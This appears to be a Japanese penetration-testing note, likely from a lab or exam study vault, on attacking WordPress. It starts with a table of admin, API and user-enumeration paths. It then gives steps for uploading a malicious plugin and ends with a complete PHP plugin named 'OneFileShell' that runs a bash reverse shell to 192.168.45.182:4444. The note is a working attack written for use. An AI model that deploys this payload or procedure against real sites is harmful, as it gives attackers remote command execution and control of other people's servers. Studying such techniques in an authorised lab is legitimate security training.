## URLパス一覧

| カテゴリ       | URL パス                              | 説明                          |
| ---------- | ----------------------------------- | --------------------------- |
| ログイン・認証関連  | /wp-login.php                       | ログインページ                     |
|            | /wp-admin/                          | 管理パネル（ログインしていないとリダイレクトされる）  |
|            | /wp-login.php?action=lostpassword   | パスワードリセットページ                |
| 管理パネル      | /wp-admin/edit.php                  | 投稿一覧                        |
|            | /wp-admin/post-new.php              | 新規投稿作成                      |
|            | `/wp-admin/edit.php?post_type=page` | 固定ページ一覧                     |
|            | `/wp-admin/upload.php`              | メディアライブラリ                   |
|            | `/wp-admin/edit-comments.php`       | コメント管理                      |
|            | `/wp-admin/themes.php`              | テーマ設定                       |
|            | `/wp-admin/plugins.php`             | プラグイン管理                     |
|            | `/wp-admin/users.php`               | ユーザー管理                      |
|            | `/wp-admin/tools.php`               | ツールページ                      |
|            | `/wp-admin/options-general.php`     | 一般設定（サイト名など）                |
|            | `/wp-admin/options-permalink.php`   | パーマリンク設定                    |
| API・特殊ファイル | `/wp-json/`                         | WordPress REST APIベースパス     |
|            | `/xmlrpc.php`                       | XML-RPCインターフェース（DoS対象になり得る） |
|            | `/wp-cron.php`                      | 疑似Cron処理（定期タスク）             |
|            | `/readme.html`                      | WordPressのバージョン情報（あれば）      |
|            | `/robots.txt`                       | クロール制御ファイル（隠しディレクトリのヒントあり）  |
| セキュリティ関連   | `/wp-admin/profile.php`             | 自ユーザープロファイル編集ページ            |
|            | `/wp-json/wp/v2/users/`             | REST API経由でのユーザー列挙          |
|            | `/wp-admin/import.php`              | データインポート（旧プラグインの脆弱性チェック対象）  |

## upload webshell
plugins > AddNew > upload plugin(zip file) > activate
![[../../../Pasted image 20250608214402.png]]

# plugin reverse shell
display name is "OneFileShell"
```
<?php
/*
Plugin Name: OneFileShell
Description: Minimal reverse shell
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.182/4444 0>&1'");
?>
```